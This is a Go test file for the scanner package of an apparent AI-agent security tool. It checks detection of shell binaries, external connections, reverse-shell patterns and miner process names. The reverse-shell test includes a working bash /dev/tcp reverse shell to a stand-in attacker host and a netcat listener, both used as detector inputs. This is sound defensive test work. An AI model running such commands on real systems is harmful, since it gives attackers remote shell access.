package scanner

import (
	"testing"

	"github.com/imdlan/AIAgentGuard/pkg/model"
)

// TestIsShellCommand tests shell command detection
func TestIsShellCommand(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{"/bin/bash", true},
		{"sh", true},
		{"cmd.exe", true},
		{"/bin/ls", false},
		{"grep", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			got := isShellCommand(tt.cmd)
			if got != tt.want {
				t.Errorf("isShellCommand(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

// TestIsExternalConnection tests external connection detection
func TestIsExternalConnection(t *testing.T) {
	tests := []struct {
		addr string
		want bool
	}{
		{"192.168.1.1:80", false},
		{"127.0.0.1:8080", false},
		{"8.8.8.8:53", true},
		{"1.1.1.1:80", true},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.addr, func(t *testing.T) {
			got := isExternalConnection(tt.addr)
			if got != tt.want {
				t.Errorf("isExternalConnection(%q) = %v, want %v", tt.addr, got, tt.want)
			}
		})
	}
}

// TestIsReverseShellPattern tests reverse shell pattern detection
func TestIsReverseShellPattern(t *testing.T) {
	tests := []struct {
		cmd  string
		want bool
	}{
		{"bash -i >& /dev/tcp/attacker.com/4444", true},
		{"nc -l -p 4444", true},
		{"ls -la", false},
		{"cat file.txt", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			got := isReverseShellPattern(tt.cmd)
			if got != tt.want {
				t.Errorf("isReverseShellPattern(%q) = %v, want %v", tt.cmd, got, tt.want)
			}
		})
	}
}

// TestDetectSuspiciousProcessNames tests suspicious process name detection
func TestDetectSuspiciousProcessNames(t *testing.T) {
	processes := []ProcessInfo{
		{Command: "xmr-miner", PID: 100},
		{Command: "legit-app", PID: 101},
	}

	suspicious := detectSuspiciousProcessNames(processes)

	if len(suspicious) != 1 {
		t.Errorf("Expected 1 suspicious process, got %d", len(suspicious))
	}

	for _, proc := range suspicious {
		if proc.Risk != model.High {
			t.Errorf("Suspicious process should have High risk, got %v", proc.Risk)
		}
	}
}
